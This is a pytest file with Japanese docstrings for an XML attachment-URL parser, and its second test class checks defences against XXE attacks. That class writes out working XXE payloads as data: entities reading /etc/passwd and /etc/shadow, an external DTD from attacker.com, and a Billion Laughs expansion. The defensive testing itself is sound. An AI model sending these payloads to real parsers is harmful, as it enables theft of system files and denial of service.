"""
xml_parserモジュールのテスト
"""

import pytest

from utils.xml_parser import extract_attachment_urls


class TestExtractAttachmentUrls:
    """extract_attachment_urls関数のテストクラス"""

    def test_single_attachment(self):
        """単一の添付ファイルURLを抽出"""
        xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/file1.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/file1.pdf"

    def test_multiple_attachments(self):
        """複数の添付ファイルURLを抽出"""
        xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/file1.pdf</URL>
          </Attachment>
          <Attachment>
            <URL>https://example.com/file2.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 2
        assert result[0] == "https://example.com/file1.pdf"
        assert result[1] == "https://example.com/file2.pdf"

    def test_empty_document(self):
        """添付ファイルがない場合は空リストを返す"""
        xml = "<Document></Document>"
        result = extract_attachment_urls(xml)

        assert result == []

    def test_invalid_xml(self):
        """無効なXMLは空リストを返す"""
        result = extract_attachment_urls("invalid xml")
        assert result == []

    def test_malformed_xml(self):
        """不正な形式のXMLは空リストを返す"""
        xml = "<Document><Attachment><URL>https://example.com/file.pdf"
        result = extract_attachment_urls(xml)
        assert result == []

    def test_attachment_without_url(self):
        """URL要素のないAttachmentは無視される"""
        xml = """
        <Document>
          <Attachment>
            <Name>File without URL</Name>
          </Attachment>
          <Attachment>
            <URL>https://example.com/valid.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/valid.pdf"

    def test_url_in_non_attachment_element(self):
        """Attachment以外の要素内のURLは無視される"""
        xml = """
        <Root>
          <Attachment>
            <URL>https://example.com/doc1.docx</URL>
          </Attachment>
          <OtherElement>
            <URL>https://example.com/ignored.txt</URL>
          </OtherElement>
        </Root>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/doc1.docx"

    def test_nested_attachments(self):
        """ネストされたAttachment要素も抽出可能"""
        xml = """
        <Root>
          <Section>
            <Attachment>
              <URL>https://example.com/nested.pdf</URL>
            </Attachment>
          </Section>
          <Attachment>
            <URL>https://example.com/top-level.pdf</URL>
          </Attachment>
        </Root>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 2
        assert "https://example.com/nested.pdf" in result
        assert "https://example.com/top-level.pdf" in result

    def test_url_with_whitespace(self):
        """URL前後の空白は除去される"""
        xml = """
        <Document>
          <Attachment>
            <URL>  https://example.com/file.pdf  </URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/file.pdf"

    def test_empty_url_element(self):
        """空のURL要素は無視される"""
        xml = """
        <Document>
          <Attachment>
            <URL></URL>
          </Attachment>
          <Attachment>
            <URL>https://example.com/valid.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/valid.pdf"

    def test_url_with_special_characters(self):
        """特殊文字を含むURLも正しく抽出"""
        xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/file?id=123&amp;type=pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/file?id=123&type=pdf"

    def test_attachment_with_multiple_elements(self):
        """複数の子要素を持つAttachmentからURL要素のみを抽出"""
        xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/doc1.docx</URL>
            <Name>Document 1</Name>
            <Size>1024</Size>
          </Attachment>
          <Attachment>
            <URL>https://example.com/doc2.xlsx</URL>
            <Name>Document 2</Name>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 2
        assert result[0] == "https://example.com/doc1.docx"
        assert result[1] == "https://example.com/doc2.xlsx"

    def test_empty_string(self):
        """空文字列は空リストを返す"""
        result = extract_attachment_urls("")
        assert result == []

    def test_xml_declaration(self):
        """XML宣言付きドキュメントも正しく処理"""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
        <Document>
          <Attachment>
            <URL>https://example.com/file.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/file.pdf"

    def test_japanese_url(self):
        """日本語を含むURLも正しく抽出"""
        xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/ファイル.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/ファイル.pdf"


class TestXXEAttackPrevention:
    """XXE（XML External Entity）攻撃防止のテストクラス"""

    def test_xxe_file_entity_attack_prevention(self):
        """
        XXE攻撃（ファイルエンティティ）が防止されることを確認

        OWASP XXE Prevention Cheat Sheet準拠
        CWE-611: Improper Restriction of XML External Entity Reference対策
        """
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <Document>
          <Attachment>
            <URL>&xxe;</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xxe_payload)

        # defusedxmlは外部エンティティを無視するため、URLは空になる
        # または外部エンティティが解決されないことを確認
        assert result == [] or not any("root:" in url for url in result)

    def test_xxe_external_dtd_attack_prevention(self):
        """
        XXE攻撃（外部DTD）が防止されることを確認

        外部DTDを使用した攻撃パターン:
        攻撃者がホストするDTDを読み込み、サーバー内部ファイルを窃取
        """
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
        <Document>
          <Attachment>
            <URL>https://example.com/safe.pdf</URL>
          </Attachment>
        </Document>
        """
        # defusedxmlは外部DTDの読み込みをブロックする
        # パースエラーまたは安全な結果が返ることを確認
        result = extract_attachment_urls(xxe_payload)

        # 外部DTDがブロックされるため、空リストまたは安全なURLのみ返される
        assert isinstance(result, list)

    def test_xxe_parameter_entity_attack_prevention(self):
        """
        XXE攻撃（パラメータエンティティ）が防止されることを確認

        パラメータエンティティを使用した高度な攻撃パターン:
        内部サブセットと外部エンティティを組み合わせた攻撃
        """
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % xxe SYSTEM "file:///etc/passwd">
          <!ENTITY % evil "<!ENTITY xxe-ref SYSTEM 'file:///etc/shadow'>">
          %xxe;
          %evil;
        ]>
        <Document>
          <Attachment>
            <URL>&xxe-ref;</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xxe_payload)

        # パラメータエンティティもブロックされる
        assert result == [] or not any("root:" in url for url in result)

    def test_xxe_billion_laughs_attack_prevention(self):
        """
        Billion Laughs攻撃（エンティティ展開DoS）が防止されることを確認

        エンティティの再帰的展開によるDoS攻撃:
        小さなXMLが指数関数的に展開されてメモリを消費
        """
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <Document>
          <Attachment>
            <URL>&lol4;</URL>
          </Attachment>
        </Document>
        """
        # defusedxmlはエンティティ展開をブロックする
        result = extract_attachment_urls(xxe_payload)

        # DoS攻撃がブロックされ、安全な結果が返る
        assert isinstance(result, list)

    def test_safe_xml_with_entity_escaping(self):
        """
        安全なXMLエンティティエスケープは正常に処理されることを確認

        &amp;, &lt;, &gt;などの標準エンティティは許可される
        """
        xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/file?id=123&amp;type=pdf&amp;format=A4</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xml)

        assert len(result) == 1
        # 標準エンティティは正しくデコードされる
        assert result[0] == "https://example.com/file?id=123&type=pdf&format=A4"

    def test_xxe_with_internal_subset(self):
        """
        内部サブセットを使用したXXE攻撃が防止されることを確認
        """
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY internal "file:///etc/hosts">
        ]>
        <Document>
          <Attachment>
            <URL>&internal;</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(xxe_payload)

        # 内部エンティティ参照もブロックされる
        assert result == [] or not any("localhost" in url.lower() for url in result)

    def test_normal_xml_after_xxe_attempt(self):
        """
        XXE攻撃試行後も通常のXML処理が正常に機能することを確認

        セキュリティ対策が正常な機能を妨げないことを検証
        """
        # まずXXE攻撃を試みる
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <Document><Attachment><URL>&xxe;</URL></Attachment></Document>
        """
        extract_attachment_urls(xxe_payload)

        # その後、通常のXMLが正常に処理されることを確認
        normal_xml = """
        <Document>
          <Attachment>
            <URL>https://example.com/normal.pdf</URL>
          </Attachment>
        </Document>
        """
        result = extract_attachment_urls(normal_xml)

        assert len(result) == 1
        assert result[0] == "https://example.com/normal.pdf"
